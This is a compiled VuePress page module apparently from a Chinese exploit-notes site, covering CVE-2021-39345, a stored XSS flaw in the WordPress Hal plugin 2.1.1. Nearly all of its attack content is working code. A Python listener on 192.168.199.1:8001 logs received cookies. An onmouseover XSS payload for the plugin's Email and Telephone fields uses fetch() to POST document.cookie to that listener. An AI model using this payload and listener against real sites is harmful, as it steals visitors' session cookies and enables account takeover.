import{_ as s,K as i,L as l,a5 as d,M as e,N as a,W as r,F as t}from"./framework-edebdfe1.js";const o="/imgs/exps/CVE-2021-39345.png",c={},v=e("h1",{id:"cve-2021-39345",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#cve-2021-39345","aria-hidden":"true"},"#"),a(" CVE-2021-39345")],-1),u=r(`<p>CVE-2021-39345-Wordpress-Hal插件漏洞,版本Wordpress插件Hal.2.1.1</p><ul><li>XSS反弹</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>from http.server import BaseHTTPRequestHandler


class PostHandler(BaseHTTPRequestHandler):
    def end_headers(self):
        self.send_header(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;)
        BaseHTTPRequestHandler.end_headers(self)


    def do_POST(self):       
        if self.path == &quot;/cookie&quot;:
            req_datas = self.rfile.read(int(self.headers[&#39;content-length&#39;]))
            print(req_datas.decode())


        self.send_response(200)
        self.send_header(&#39;Content-type&#39;, &#39;application/json&#39;)
        self.end_headers()


if __name__ == &#39;__main__&#39;:
    from http.server import HTTPServer
    server = HTTPServer((&#39;192.168.199.1&#39;, 8001), PostHandler)
    print(&#39;Starting server, use &lt;Ctrl-C&gt; to stop&#39;)
    server.serve_forever()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>在Hal的Email，Telephone等输入框中插入Payload</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>&quot;OnMoUsEoVeR=fetch(&quot;http://192.168.199.1:8001/cookie&quot;,{method:&#39;POST&#39;,body:document.cookie,mode:&#39;cors&#39;})//
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>把鼠标重新放到Email，Telephone等输入框中即触发Payload</li></ul><p><img src="`+o+'" alt="er" loading="lazy"></p>',7);function m(_,p){const n=t("DocsAD");return i(),l("div",null,[v,d(n),u])}const f=s(c,[["render",m],["__file","CVE-2021-39345.html.vue"]]);export{f as default};
